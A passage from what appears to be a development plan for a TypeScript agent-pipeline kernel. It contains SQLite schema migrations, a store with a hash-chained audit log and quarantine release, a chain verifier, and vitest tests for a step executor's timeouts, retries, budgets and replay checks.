`src/kernel/store/migrations.ts`:

```ts
export const SCHEMA_VERSION = 1;

export const MIGRATIONS: readonly string[] = [
  `
  CREATE TABLE runs (
    run_id TEXT PRIMARY KEY,
    pipeline TEXT NOT NULL,
    policy_hash TEXT NOT NULL,
    started_at TEXT NOT NULL,
    finished_at TEXT,
    status TEXT NOT NULL CHECK (status IN ('running', 'completed'))
  );
  CREATE TABLE steps (
    step_key TEXT PRIMARY KEY,
    agent_id TEXT NOT NULL,
    contract_version TEXT NOT NULL,
    contract_hash TEXT NOT NULL,
    input_envelope_id TEXT NOT NULL,
    status TEXT NOT NULL CHECK (status IN ('running', 'done', 'failed', 'quarantined')),
    attempts INTEGER NOT NULL,
    error_code TEXT,
    detail TEXT
  );
  CREATE TABLE envelopes (
    envelope_id TEXT PRIMARY KEY,
    step_key TEXT NOT NULL,
    idx INTEGER NOT NULL,
    type TEXT NOT NULL,
    body TEXT NOT NULL
  );
  CREATE INDEX envelopes_by_step ON envelopes (step_key, idx);
  CREATE TABLE queue (
    run_id TEXT NOT NULL,
    stage INTEGER NOT NULL,
    agent_id TEXT NOT NULL,
    envelope_id TEXT NOT NULL,
    status TEXT NOT NULL CHECK (status IN ('pending', 'done', 'failed', 'quarantined', 'skipped')),
    PRIMARY KEY (run_id, agent_id, envelope_id)
  );
  CREATE TABLE cost_ledger (
    run_id TEXT NOT NULL,
    step_key TEXT NOT NULL,
    agent_id TEXT NOT NULL,
    usd REAL NOT NULL,
    input_tokens INTEGER NOT NULL,
    output_tokens INTEGER NOT NULL,
    max_call_usd REAL NOT NULL DEFAULT 0
  );
  CREATE TABLE events (
    seq INTEGER PRIMARY KEY AUTOINCREMENT,
    run_id TEXT NOT NULL,
    at TEXT NOT NULL,
    kind TEXT NOT NULL,
    data TEXT NOT NULL,
    policy_hash TEXT NOT NULL,
    prev_hash TEXT NOT NULL,
    hash TEXT NOT NULL
  );
  CREATE TABLE chain_head (
    id INTEGER PRIMARY KEY CHECK (id = 1),
    seq INTEGER NOT NULL,
    hash TEXT NOT NULL,
    count INTEGER NOT NULL
  );
  CREATE TABLE entities (
    kind TEXT NOT NULL,
    entity_id TEXT NOT NULL,
    state TEXT NOT NULL,
    PRIMARY KEY (kind, entity_id)
  );
  CREATE TABLE entity_transitions (
    kind TEXT NOT NULL,
    entity_id TEXT NOT NULL,
    step_key TEXT NOT NULL,
    event TEXT NOT NULL,
    from_state TEXT NOT NULL,
    to_state TEXT NOT NULL,
    outcome TEXT NOT NULL CHECK (outcome IN ('done', 'quarantined')),
    PRIMARY KEY (kind, entity_id, step_key, event)
  );
  CREATE TABLE contracts (
    agent_id TEXT NOT NULL,
    version TEXT NOT NULL,
    hash TEXT NOT NULL,
    shape TEXT NOT NULL,
    PRIMARY KEY (agent_id, version)
  );
  `,
];
```

`src/kernel/store/store.ts`:

```ts
import Database from 'better-sqlite3';
import { canonicalJson, sha256 } from '../canonical.js';
import type { Cost, Envelope } from '../envelope.js';
import type { ErrorCode } from '../errors.js';
import type { StateMachine } from '../state-machine.js';
import { MIGRATIONS } from './migrations.js';

export type StepStatus = 'running' | 'done' | 'failed' | 'quarantined';
export type QueueStatus = 'pending' | 'done' | 'failed' | 'quarantined' | 'skipped';

/** One entity, named by its tracker kind and id. */
export interface EntityRef {
  readonly kind: string;
  readonly entityId: string;
}

export interface StepRow {
  readonly step_key: string;
  readonly agent_id: string;
  readonly contract_version: string;
  readonly contract_hash: string;
  readonly input_envelope_id: string;
  readonly status: StepStatus;
  readonly attempts: number;
  readonly error_code: ErrorCode | null;
  readonly detail: string | null;
}

export interface QueueRow {
  readonly run_id: string;
  readonly stage: number;
  readonly agent_id: string;
  readonly envelope_id: string;
  readonly status: QueueStatus;
}

export interface EventRow {
  readonly seq: number;
  readonly run_id: string;
  readonly at: string;
  readonly kind: string;
  readonly data: string;
  readonly policy_hash: string;
  readonly prev_hash: string;
  readonly hash: string;
}

export const GENESIS_HASH = '0'.repeat(64);

export function eventHash(prevHash: string, e: Pick<EventRow, 'run_id' | 'at' | 'kind' | 'data' | 'policy_hash'>): string {
  return sha256(prevHash + canonicalJson({ run_id: e.run_id, at: e.at, kind: e.kind, data: e.data, policy_hash: e.policy_hash }));
}

/**
 * The only module that touches SQLite. better-sqlite3 is synchronous, so
 * writes happen in program order and every multi-row write is one transaction.
 */
export class Store {
  private constructor(readonly db: Database.Database) {}

  static open(path: string): Store {
    const db = new Database(path);
    db.pragma('journal_mode = WAL');
    db.pragma('foreign_keys = ON');
    try {
      const version = db.pragma('user_version', { simple: true }) as number;
      if (version > MIGRATIONS.length) {
        throw new Error(`database schema version ${version} is newer than this jobpilot (${MIGRATIONS.length})`);
      }
      for (let v = version; v < MIGRATIONS.length; v++) {
        db.transaction(() => {
          db.exec(MIGRATIONS[v] ?? '');
          db.pragma(`user_version = ${v + 1}`);
        })();
      }
    } catch (err) {
      db.close();
      throw err;
    }
    return new Store(db);
  }

  close(): void {
    this.db.close();
  }

  tx<T>(fn: () => T): T {
    return this.db.transaction(fn)();
  }

  // runs
  startRun(runId: string, pipeline: string, policyHash: string, at: string): void {
    this.db
      .prepare(`INSERT INTO runs (run_id, pipeline, policy_hash, started_at, status) VALUES (?, ?, ?, ?, 'running')`)
      .run(runId, pipeline, policyHash, at);
  }

  finishRun(runId: string, at: string): void {
    this.db.prepare(`UPDATE runs SET status = 'completed', finished_at = ? WHERE run_id = ?`).run(at, runId);
  }

  getRun(runId: string): { run_id: string; pipeline: string; policy_hash: string; status: string } | undefined {
    return this.db.prepare(`SELECT run_id, pipeline, policy_hash, status FROM runs WHERE run_id = ?`).get(runId) as
      | { run_id: string; pipeline: string; policy_hash: string; status: string }
      | undefined;
  }

  // steps
  getStep(stepKey: string): StepRow | undefined {
    return this.db.prepare(`SELECT * FROM steps WHERE step_key = ?`).get(stepKey) as StepRow | undefined;
  }

  markRunning(s: { stepKey: string; agentId: string; version: string; contractHash: string; inputEnvelopeId: string }): void {
    this.db
      .prepare(
        `INSERT INTO steps (step_key, agent_id, contract_version, contract_hash, input_envelope_id, status, attempts)
         VALUES (?, ?, ?, ?, ?, 'running', 1)
         ON CONFLICT (step_key) DO UPDATE SET agent_id = excluded.agent_id, contract_version = excluded.contract_version,
           contract_hash = excluded.contract_hash, input_envelope_id = excluded.input_envelope_id,
           status = 'running', attempts = attempts + 1, error_code = NULL, detail = NULL`,
      )
      .run(s.stepKey, s.agentId, s.version, s.contractHash, s.inputEnvelopeId);
  }

  /** Writes the step outcome, its envelopes, its cost and (when given) its hash-chained event atomically. */
  finishStep(a: {
    runId: string;
    stepKey: string;
    agentId: string;
    status: Exclude<StepStatus, 'running'>;
    envelopes: readonly Envelope[];
    cost: Cost;
    /** The largest single model call paid in this step. */
    maxCallUsd?: number;
    errorCode?: ErrorCode;
    detail?: string;
    event?: { at: string; kind: string; data: unknown; policyHash: string };
  }): void {
    this.tx(() => {
      const res = this.db
        .prepare(`UPDATE steps SET status = ?, error_code = ?, detail = ? WHERE step_key = ? AND status = 'running'`)
        .run(a.status, a.errorCode ?? null, a.detail ?? null, a.stepKey);
      if (res.changes !== 1) throw new Error(`finishStep: step ${a.stepKey} is not running`);
      const ins = this.db.prepare(`INSERT INTO envelopes (envelope_id, step_key, idx, type, body) VALUES (?, ?, ?, ?, ?)`);
      for (const e of a.envelopes) ins.run(e.envelopeId, e.stepKey, e.index, e.type, canonicalJson(e));
      if (a.cost.usd > 0 || a.cost.inputTokens > 0 || a.cost.outputTokens > 0) {
        this.db
          .prepare(`INSERT INTO cost_ledger (run_id, step_key, agent_id, usd, input_tokens, output_tokens, max_call_usd) VALUES (?, ?, ?, ?, ?, ?, ?)`)
          .run(a.runId, a.stepKey, a.agentId, a.cost.usd, a.cost.inputTokens, a.cost.outputTokens, a.maxCallUsd ?? 0);
      }
      if (a.event) this.appendEvent(a.runId, a.event.at, a.event.kind, a.event.data, a.event.policyHash);
    });
  }

  /** For seed envelopes, which have no agent behind them. */
  putSeed(stepKey: string, env: Envelope, pipelineVersion: string, seedHash: string): void {
    this.tx(() => {
      this.db
        .prepare(
          `INSERT OR IGNORE INTO steps (step_key, agent_id, contract_version, contract_hash, input_envelope_id, status, attempts)
           VALUES (?, 'supervisor', ?, ?, '', 'done', 0)`,
        )
        .run(stepKey, pipelineVersion, seedHash);
      this.db
        .prepare(`INSERT OR IGNORE INTO envelopes (envelope_id, step_key, idx, type, body) VALUES (?, ?, ?, ?, ?)`)
        .run(env.envelopeId, env.stepKey, env.index, env.type, canonicalJson(env));
    });
  }

  envelopesOfStep(stepKey: string): Envelope[] {
    const rows = this.db.prepare(`SELECT body FROM envelopes WHERE step_key = ? ORDER BY idx`).all(stepKey) as { body: string }[];
    return rows.map((r) => JSON.parse(r.body) as Envelope);
  }

  getEnvelope(envelopeId: string): Envelope {
    const row = this.db.prepare(`SELECT body FROM envelopes WHERE envelope_id = ?`).get(envelopeId) as { body: string } | undefined;
    if (!row) throw new Error(`unknown envelope ${envelopeId}`);
    return JSON.parse(row.body) as Envelope;
  }

  // cost
  runCost(runId: string, agentId?: string): number {
    const row = (
      agentId === undefined
        ? this.db.prepare(`SELECT COALESCE(SUM(usd), 0) AS usd FROM cost_ledger WHERE run_id = ?`).get(runId)
        : this.db.prepare(`SELECT COALESCE(SUM(usd), 0) AS usd FROM cost_ledger WHERE run_id = ? AND agent_id = ?`).get(runId, agentId)
    ) as { usd: number };
    return row.usd;
  }

  /** The largest single model call this agent was charged in this run. */
  maxCallCost(runId: string, agentId: string): number {
    const row = this.db.prepare(`SELECT COALESCE(MAX(max_call_usd), 0) AS usd FROM cost_ledger WHERE run_id = ? AND agent_id = ?`).get(runId, agentId) as {
      usd: number;
    };
    return row.usd;
  }

  // queue
  enqueue(runId: string, stage: number, agentId: string, envelopeId: string): void {
    this.db
      .prepare(`INSERT OR IGNORE INTO queue (run_id, stage, agent_id, envelope_id, status) VALUES (?, ?, ?, ?, 'pending')`)
      .run(runId, stage, agentId, envelopeId);
  }

  /** Total order: stage, then agent, then envelope id. Network timing never decides what runs next. */
  nextQueued(runId: string): QueueRow | undefined {
    return this.db
      .prepare(`SELECT * FROM queue WHERE run_id = ? AND status = 'pending' ORDER BY stage, agent_id, envelope_id LIMIT 1`)
      .get(runId) as QueueRow | undefined;
  }

  markQueue(runId: string, agentId: string, envelopeId: string, status: QueueStatus): void {
    this.db.prepare(`UPDATE queue SET status = ? WHERE run_id = ? AND agent_id = ? AND envelope_id = ?`).run(status, runId, agentId, envelopeId);
  }

  queueCounts(runId: string): Record<QueueStatus, number> {
    const rows = this.db.prepare(`SELECT status, COUNT(*) AS n FROM queue WHERE run_id = ? GROUP BY status`).all(runId) as { status: QueueStatus; n: number }[];
    const out: Record<QueueStatus, number> = { pending: 0, done: 0, failed: 0, quarantined: 0, skipped: 0 };
    for (const r of rows) out[r.status] = r.n;
    return out;
  }

  // events: append-only, hash-chained
  appendEvent(runId: string, at: string, kind: string, data: unknown, policyHash: string): void {
    this.tx(() => {
      const head = this.chainHead();
      const prev = head?.hash ?? GENESIS_HASH;
      const row = { run_id: runId, at, kind, data: canonicalJson(data), policy_hash: policyHash };
      const hash = eventHash(prev, row);
      const res = this.db
        .prepare(`INSERT INTO events (run_id, at, kind, data, policy_hash, prev_hash, hash) VALUES (?, ?, ?, ?, ?, ?, ?)`)
        .run(row.run_id, row.at, row.kind, row.data, row.policy_hash, prev, hash);
      this.db
        .prepare(
          `INSERT INTO chain_head (id, seq, hash, count) VALUES (1, ?, ?, 1)
           ON CONFLICT (id) DO UPDATE SET seq = excluded.seq, hash = excluded.hash, count = count + 1`,
        )
        .run(Number(res.lastInsertRowid), hash);
    });
  }

  /** The stored anchor of the audit chain: last seq, last hash and number of events appended. */
  chainHead(): { seq: number; hash: string; count: number } | undefined {
    return this.db.prepare(`SELECT seq, hash, count FROM chain_head WHERE id = 1`).get() as
      | { seq: number; hash: string; count: number }
      | undefined;
  }

  events(runId?: string): EventRow[] {
    return (
      runId === undefined
        ? this.db.prepare(`SELECT * FROM events ORDER BY seq`).all()
        : this.db.prepare(`SELECT * FROM events WHERE run_id = ? ORDER BY seq`).all(runId)
    ) as EventRow[];
  }

  // entities: one namespace per tracker kind; idempotent per (kind, entity, step, event), so a replayed step never double-applies
  applyTransition(
    entityId: string,
    kind: string,
    stepKey: string,
    event: string,
    machine: StateMachine,
    outcome: 'done' | 'quarantined',
  ): string | undefined {
    return this.tx(() => {
      if (this.hasTransition(entityId, kind, stepKey, event)) return undefined;
      const cur = this.db.prepare(`SELECT state FROM entities WHERE kind = ? AND entity_id = ?`).get(kind, entityId) as { state: string } | undefined;
      const from = cur?.state ?? machine.def.initial;
      const to = machine.next(from, event);
      this.db
        .prepare(`INSERT INTO entities (kind, entity_id, state) VALUES (?, ?, ?) ON CONFLICT (kind, entity_id) DO UPDATE SET state = excluded.state`)
        .run(kind, entityId, to);
      this.db
        .prepare(`INSERT INTO entity_transitions (kind, entity_id, step_key, event, from_state, to_state, outcome) VALUES (?, ?, ?, ?, ?, ?, ?)`)
        .run(kind, entityId, stepKey, event, from, to, outcome);
      return to;
    });
  }

  hasTransition(entityId: string, kind: string, stepKey: string, event: string): boolean {
    return (
      this.db.prepare(`SELECT 1 FROM entity_transitions WHERE kind = ? AND entity_id = ? AND step_key = ? AND event = ?`).get(kind, entityId, stepKey, event) !==
      undefined
    );
  }

  /** The entity's state under `kind`; without a kind, the id must belong to at most one kind. */
  entityState(entityId: string, kind?: string): string | undefined {
    if (kind !== undefined) {
      return (this.db.prepare(`SELECT state FROM entities WHERE kind = ? AND entity_id = ?`).get(kind, entityId) as { state: string } | undefined)?.state;
    }
    const rows = this.db.prepare(`SELECT kind, state FROM entities WHERE entity_id = ? ORDER BY kind`).all(entityId) as { kind: string; state: string }[];
    if (rows.length > 1) throw new Error(`entity ${entityId} is ambiguous: it exists under kinds ${rows.map((r) => r.kind).join(', ')}`);
    return rows[0]?.state;
  }

  saveContract(agentId: string, version: string, hash: string, shape: unknown): void {
    this.db
      .prepare(`INSERT INTO contracts (agent_id, version, hash, shape) VALUES (?, ?, ?, ?) ON CONFLICT (agent_id, version) DO UPDATE SET hash = excluded.hash, shape = excluded.shape`)
      .run(agentId, version, hash, canonicalJson(shape));
  }

  // quarantine release: the user fixed the cause, so the step may run again
  /**
   * Quarantined step rows, plus door trips: an input-side trip writes no step row, but a
   * tracker may have moved entities under its step key. Those take agent and detail from
   * the step's latest `step_quarantined` event.
   */
  quarantinedSteps(): { step_key: string; agent_id: string; detail: string | null }[] {
    const rows = this.db.prepare(`SELECT step_key, agent_id, detail FROM steps WHERE status = 'quarantined'`).all() as {
      step_key: string;
      agent_id: string;
      detail: string | null;
    }[];
    const listed = new Set(rows.map((r) => r.step_key));
    const doorKeys = (
      this.db.prepare(`SELECT DISTINCT step_key FROM entity_transitions WHERE outcome = 'quarantined' ORDER BY step_key`).all() as { step_key: string }[]
    ).filter((r) => !listed.has(r.step_key));
    for (const { step_key } of doorKeys) {
      const ev = this.db
        .prepare(`SELECT data FROM events WHERE kind = 'step_quarantined' AND json_extract(data, '$.stepKey') = ? ORDER BY seq DESC LIMIT 1`)
        .get(step_key) as { data: string } | undefined;
      const d = ev ? (JSON.parse(ev.data) as { agent?: unknown; verdict?: unknown }) : {};
      rows.push({
        step_key,
        agent_id: typeof d.agent === 'string' ? d.agent : '',
        detail: d.verdict === undefined ? null : canonicalJson([d.verdict]),
      });
    }
    return rows.sort((a, b) => (a.step_key < b.step_key ? -1 : a.step_key > b.step_key ? 1 : 0));
  }

  /** The policy hash of the run that last quarantined this step key, from its `step_quarantined` event. */
  quarantinePolicyHash(stepKey: string): string | undefined {
    const row = this.db
      .prepare(`SELECT policy_hash FROM events WHERE kind = 'step_quarantined' AND json_extract(data, '$.stepKey') = ? ORDER BY seq DESC LIMIT 1`)
      .get(stepKey) as { policy_hash: string } | undefined;
    return row?.policy_hash;
  }

  /**
   * Forgets a quarantined step so the next run executes it again, and puts every entity
   * a quarantined outcome moved under that step key back where it was (whatever the event
   * was called). An entity that has moved on since the trip (its state is no longer the
   * trip's `to_state`) is left alone, its transition row kept, and reported in `skipped`.
   * Works for door trips too, which have no step row. One transaction, audited as
   * `quarantine_released`. Idempotent: when nothing was reverted and no step row deleted,
   * returns `released: false` and appends no event.
   */
  releaseQuarantine(stepKey: string, runId: string, at: string, policyHash: string): { released: boolean; entities: EntityRef[]; skipped: EntityRef[] } {
    return this.tx(() => {
      const trips = this.db
        .prepare(
          `SELECT kind, entity_id, event, from_state, to_state FROM entity_transitions WHERE step_key = ? AND outcome = 'quarantined' ORDER BY entity_id, kind, event`,
        )
        .all(stepKey) as { kind: string; entity_id: string; event: string; from_state: string; to_state: string }[];
      const deletedStep = this.db.prepare(`DELETE FROM steps WHERE step_key = ? AND status = 'quarantined'`).run(stepKey).changes > 0;
      const entities = new Map<string, EntityRef>();
      const skipped = new Map<string, EntityRef>();
      for (const t of trips) {
        const ref = { kind: t.kind, entityId: t.entity_id };
        const id = JSON.stringify([t.kind, t.entity_id]);
        const res = this.db
          .prepare(`UPDATE entities SET state = ? WHERE kind = ? AND entity_id = ? AND state = ?`)
          .run(t.from_state, t.kind, t.entity_id, t.to_state);
        if (res.changes !== 1) {
          skipped.set(id, ref);
          continue;
        }
        entities.set(id, ref);
        this.db
          .prepare(`DELETE FROM entity_transitions WHERE kind = ? AND entity_id = ? AND step_key = ? AND event = ?`)
          .run(t.kind, t.entity_id, stepKey, t.event);
      }
      const result = { entities: [...entities.values()], skipped: [...skipped.values()] };
      // Idempotent: a release that changes nothing is not a release and leaves no event.
      if (!deletedStep && result.entities.length === 0) return { released: false, ...result };
      this.appendEvent(runId, at, 'quarantine_released', { stepKey, ...result }, policyHash);
      return { released: true, ...result };
    });
  }

  /** Every contract version any run on this database has used. */
  contracts(): { agent_id: string; version: string; hash: string; shape: Record<string, unknown> }[] {
    const rows = this.db.prepare(`SELECT agent_id, version, hash, shape FROM contracts ORDER BY agent_id, version`).all() as {
      agent_id: string;
      version: string;
      hash: string;
      shape: string;
    }[];
    return rows.map((r) => ({ ...r, shape: JSON.parse(r.shape) as Record<string, unknown> }));
  }

  /** Test and audit helper: a whole table as canonical text, in a fixed order. */
  dump(table: 'envelopes' | 'entities' | 'steps', orderBy: string): string {
    if (!['envelopes', 'entities', 'steps'].includes(table) || !/^[a-z_]+(, ?[a-z_]+)*$/.test(orderBy)) {
      throw new Error('dump: refused');
    }
    const rows = this.db.prepare(`SELECT * FROM ${table} ORDER BY ${orderBy}`).all();
    return canonicalJson(rows);
  }
}
```

`src/kernel/store/audit.ts`:

```ts
import { GENESIS_HASH, type Store, eventHash } from './store.js';

export type AuditResult =
  | { ok: true; events: number }
  | { ok: false; brokenAt: number; reason: string }
  /** The chain itself is intact, but its head is not the one the caller expected. */
  | { ok: false; headMismatch: true; events: number; reason: string };

/**
 * Walks the event chain from genesis, then checks it against the stored chain head.
 * Edited, inserted, deleted and truncated events are all caught.
 *
 * Limits: the chain is unkeyed, so it detects accidental and naive tampering only. A writer
 * with full database access can rewrite events and the head consistently; pass `expectedHead`
 * (an out-of-band copy, e.g. noted by the user) to catch that. Envelope bodies and the cost
 * ledger are not chained.
 */
export function verifyChain(store: Store, expectedHead?: { hash: string; count: number }): AuditResult {
  let prev = GENESIS_HASH;
  const rows = store.events();
  for (const r of rows) {
    if (r.prev_hash !== prev) return { ok: false, brokenAt: r.seq, reason: 'prev_hash does not match the previous event' };
    if (eventHash(prev, r) !== r.hash) return { ok: false, brokenAt: r.seq, reason: 'hash does not match the event contents' };
    prev = r.hash;
  }
  const head = store.chainHead();
  if (rows.length > 0 || head !== undefined) {
    if (head === undefined || head.count !== rows.length || head.hash !== prev) {
      return {
        ok: false,
        brokenAt: rows[rows.length - 1]?.seq ?? 0,
        reason: 'chain head does not match the events (truncated or rewritten tail)',
      };
    }
  }
  if (expectedHead !== undefined && (head === undefined || head.hash !== expectedHead.hash || head.count !== expectedHead.count)) {
    return { ok: false, headMismatch: true, events: rows.length, reason: 'chain head differs from the expected head' };
  }
  return { ok: true, events: rows.length };
}
```

### Task 11: Step keys and the step executor

The thirteen-step procedure from spec §6.1, identical for every agent: replay check, input guardrails, run budget, scoped context, timeout, bounded retries with reproducible backoff, output guardrails with taint, one transaction.

**Files:**
- Create: `src/kernel/memo.ts`
- Create: `src/kernel/executor.ts`
- Test: `tests/kernel/executor.test.ts`

**Interfaces:**
- Consumes: everything above.
- Produces: `computeStepKey(contract, input, policyHash)`, `backoffDelay(stepKey, attempt, backoffMs)`; `ExecutorDeps`, `StepOutcome` (`done` | `quarantined` | `failed` | `skipped`), `executeStep(deps, runId, agent, input)`.

- [ ] **Step 1: Write the failing test**

`tests/kernel/executor.test.ts`:

```ts
import { describe, expect, it } from 'vitest';
import { defineAgent } from '../../src/kernel/agent.js';
import { fixedClock } from '../../src/kernel/clock.js';
import { contractHash, defineContract } from '../../src/kernel/contract.js';
import { type Envelope, ZERO_COST } from '../../src/kernel/envelope.js';
import { KernelError } from '../../src/kernel/errors.js';
import { executeStep, type ExecutorDeps } from '../../src/kernel/executor.js';
import type { AnyAgent } from '../../src/kernel/agent.js';
import type { LlmProvider } from '../../src/kernel/providers.js';
import { builtinGuardrails } from '../../src/kernel/guardrails/builtin.js';
import { backoffDelay } from '../../src/kernel/memo.js';
import { PRODUCT_POLICY_V1, policyHash } from '../../src/kernel/policy.js';
import { Store } from '../../src/kernel/store/store.js';
import { demoSourceContract } from '../../src/demo/agents.js';
import { countPositive, DemoItem, DemoRequest, itemIdSet } from '../../src/demo/types.js';

const pHash = policyHash(PRODUCT_POLICY_V1);
const slow = defineAgent(
  defineContract({
    ...demoSourceContract,
    id: 'slow-source',
    description: 'Never answers within its timeout',
    timeoutMs: 20,
    obligations: { adds: [], discharges: [] },
  }),
  () => new Promise<never>(() => {}),
);

const seedEnv = (): Envelope => ({
  envelopeId: 'seed', stepKey: 'seed-step', index: 0, type: 'DemoRequest@1',
  producer: { agentId: 'supervisor', version: '1.0.0', contractHash: 'seed-hash' },
  parents: [], payload: { count: 1, prefix: 'demo' },
  handoff: { guarantees: ['request.count-positive'], dataClass: 'P0', obligations: [], pins: { policyHash: pHash } },
  guardrails: [], cost: ZERO_COST,
});

const deps = (store: Store, sleeps: number[], invoked: string[]): ExecutorDeps => ({
  store, policy: PRODUCT_POLICY_V1, policyHash: pHash, providers: { fetch: async () => ({ status: 404, text: async () => '' }) },
  clock: fixedClock('2026-10-08T00:00:00Z'), guardrails: builtinGuardrails(),
  contractHashOf: (id) => (id === 'supervisor' ? 'seed-hash' : contractHash(slow.contract)),
  sleep: async (ms) => { sleeps.push(ms); }, onInvoke: (a) => invoked.push(a),
});

describe('executeStep', () => {
  it('times out an agent that ignores its signal, and does not retry without a retry policy', async () => {
    const store = Store.open(':memory:');
    const invoked: string[] = [];
    const out = await executeStep(deps(store, [], invoked), 'r', slow, seedEnv());
    expect(out).toMatchObject({ kind: 'failed', error: 'timeout' });
    expect(invoked).toEqual(['slow-source']);
    expect(store.getStep(out.stepKey)?.status).toBe('failed');
  });

  it('retries a timeout when the contract allows it, with reproducible backoff', async () => {
    const retrying = defineAgent(defineContract({ ...slow.contract, retry: { max: 2, on: ['timeout'], backoffMs: [100, 400] } }), slow.run);
    const store = Store.open(':memory:');
    const sleeps: number[] = [];
    const invoked: string[] = [];
    const out = await executeStep({ ...deps(store, sleeps, invoked), contractHashOf: (id) => (id === 'supervisor' ? 'seed-hash' : contractHash(retrying.contract)) }, 'r', retrying, seedEnv());
    expect(out.kind).toBe('failed');
    expect(invoked).toHaveLength(3);
    expect(sleeps).toEqual([backoffDelay(out.stepKey, 0, [100, 400]), backoffDelay(out.stepKey, 1, [100, 400])]);
    expect(store.getStep(out.stepKey)?.attempts).toBe(3);
  });

  it('quarantines at the door when the input envelope type is wrong', async () => {
    const store = Store.open(':memory:');
    const invoked: string[] = [];
    const bad = { ...seedEnv(), type: DemoItem.id };
    const out = await executeStep(deps(store, [], invoked), 'r', slow, bad);
    expect(out.kind).toBe('quarantined');
    expect(invoked).toEqual([]);
  });
});

/** A provider that charges a fixed price per call. */
const pricedLlm = (usd: number): LlmProvider => ({
  host: 'api.anthropic.com',
  complete: async () => ({ text: 'ok', inputTokens: 1, outputTokens: 1, usd }),
});

/** An llm agent that pays for one model call per attempt, then rate-limits on the listed attempts (1-based). */
const payingAgent = (opts: { usdPerRun: number; failOn: readonly number[] }): AnyAgent => {
  let n = 0;
  return defineAgent(
    defineContract({
      id: 'paying-writer',
      version: '1.0.0',
      description: 'Writes one demo item with the model',
      skills: ['demo-writing'],
      team: 'sourcing',
      kind: 'llm',
      consumes: DemoRequest,
      produces: DemoItem,
      requires: [countPositive],
      guarantees: [itemIdSet],
      capabilities: { llm: { model: 'claude-sonnet-5-5', maxTokens: 50 } },
      egress: ['api.anthropic.com'],
      dataClasses: { in: ['P0'], out: ['P0'] },
      budget: { usdPerCall: 0.003, usdPerRun: opts.usdPerRun },
      timeoutMs: 1_000,
      retry: { max: 2, on: ['rate_limit'], backoffMs: [10, 10] },
    }),
    async (req, ctx) => {
      n += 1;
      if (!ctx.llm) throw new KernelError('policy_denied', 'no llm');
      await ctx.llm.complete({ system: 's', prompt: 'p' });
      if (opts.failOn.includes(n)) throw new KernelError('rate_limit', `attempt ${n} rate limited`);
      return [{ id: `${req.prefix}-001`, text: 'written' }];
    },
  );
};

const depsFor = (store: Store, agent: AnyAgent, invoked: string[], extra: Partial<ExecutorDeps> = {}): ExecutorDeps => ({
  ...deps(store, [], invoked),
  providers: { fetch: async () => ({ status: 404, text: async () => '' }), llm: pricedLlm(0.002) },
  contractHashOf: (id) => (id === 'supervisor' ? 'seed-hash' : id === agent.contract.id ? contractHash(agent.contract) : undefined),
  ...extra,
});

const forged = (): Envelope => ({ ...seedEnv(), producer: { ...seedEnv().producer, contractHash: 'forged-hash' } });

describe('executeStep: spec order, spend, events, never throws', () => {
  it('does not cache an input-side quarantine', async () => {
    const store = Store.open(':memory:');
    const invoked: string[] = [];
    const a = payingAgent({ usdPerRun: 0.5, failOn: [] });
    const first = await executeStep(depsFor(store, a, invoked), 'r', a, forged());
    expect(first.kind).toBe('quarantined');
    expect(store.getStep(first.stepKey)).toBeUndefined();
    expect(store.events('r').map((e) => e.kind)).toEqual(['step_quarantined']);
    const second = await executeStep(depsFor(store, a, invoked), 'r', a, seedEnv());
    expect(second.stepKey).toBe(first.stepKey);
    expect(second).toMatchObject({ kind: 'done', replayed: false });
    expect(invoked).toEqual(['paying-writer']);
  });

  it('replays a done step without running the agent, but runs the input guardrails first', async () => {
    const store = Store.open(':memory:');
    const invoked: string[] = [];
    const a = payingAgent({ usdPerRun: 0.5, failOn: [] });
    const first = await executeStep(depsFor(store, a, invoked), 'r', a, seedEnv());
    expect(first).toMatchObject({ kind: 'done', replayed: false });
    const again = await executeStep(depsFor(store, a, invoked), 'r', a, seedEnv());
    expect(again).toMatchObject({ kind: 'done', replayed: true, stepKey: first.stepKey });
    expect(again.kind === 'done' && again.outputs).toEqual(first.kind === 'done' && first.outputs);
    expect(invoked).toEqual(['paying-writer']);
    const replayed = store.events('r').filter((e) => e.kind === 'step_replayed');
    expect(replayed).toHaveLength(1);
    expect(JSON.parse(replayed[0]?.data ?? '{}')).toMatchObject({ stepKey: first.stepKey, status: 'done' });
    const forgedRun = await executeStep(depsFor(store, a, invoked), 'r', a, forged());
    expect(forgedRun).toMatchObject({ kind: 'quarantined', stepKey: first.stepKey });
    expect(invoked).toEqual(['paying-writer']);
  });

  it('counts spend across every attempt', async () => {
    const store = Store.open(':memory:');
    const invoked: string[] = [];
    const a = payingAgent({ usdPerRun: 0.5, failOn: [1] });
    const out = await executeStep(depsFor(store, a, invoked), 'r', a, seedEnv());
    expect(out.kind).toBe('done');
    expect(invoked).toHaveLength(2);
    expect(store.runCost('r')).toBeCloseTo(0.004, 10);
  });

  it('refuses a retry that would exceed the run budget', async () => {
    const store = Store.open(':memory:');
    const invoked: string[] = [];
    const a = payingAgent({ usdPerRun: 0.003, failOn: [1, 2, 3] });
    const out = await executeStep(depsFor(store, a, invoked), 'r', a, seedEnv());
    expect(out).toMatchObject({ kind: 'failed', error: 'budget_exceeded' });
    expect(invoked).toHaveLength(2);
    // The second attempt runs, but the broker refuses its call: 0.002 spent + 0.003 reserved > 0.003.
    expect(store.runCost('r')).toBeCloseTo(0.002, 10);
    expect(store.getStep(out.stepKey)).toMatchObject({ status: 'failed', error_code: 'budget_exceeded' });
  });

  it('never throws: a rejecting sleep becomes a failed step', async () => {
    const store = Store.open(':memory:');
    const invoked: string[] = [];
    const a = payingAgent({ usdPerRun: 0.5, failOn: [1] });
    const sleep = async (): Promise<void> => { throw new Error('sleep broke'); };
    const out = await executeStep(depsFor(store, a, invoked, { sleep }), 'r', a, seedEnv());
    expect(out).toMatchObject({ kind: 'failed', error: 'unknown', detail: 'sleep broke' });
    expect(store.getStep(out.stepKey)).toMatchObject({ status: 'failed', error_code: 'unknown' });
    expect(store.runCost('r')).toBeCloseTo(0.002, 10);
    expect(store.events('r').map((e) => e.kind)).toContain('step_failed');
  });

  it('never throws while formatting an unprintable error', async () => {
    const store = Store.open(':memory:');
    const invoked: string[] = [];
    const a = payingAgent({ usdPerRun: 0.5, failOn: [1] });
    const sleep = async (): Promise<void> => { throw Object.create(null); };
    const out = await executeStep(depsFor(store, a, invoked, { sleep }), 'r', a, seedEnv());
    expect(out).toMatchObject({ kind: 'failed', error: 'unknown' });
  });

  it('chains a step_done event for every done step', async () => {
    const store = Store.open(':memory:');
    const a = payingAgent({ usdPerRun: 0.5, failOn: [] });
    const out = await executeStep(depsFor(store, a, []), 'r', a, seedEnv());
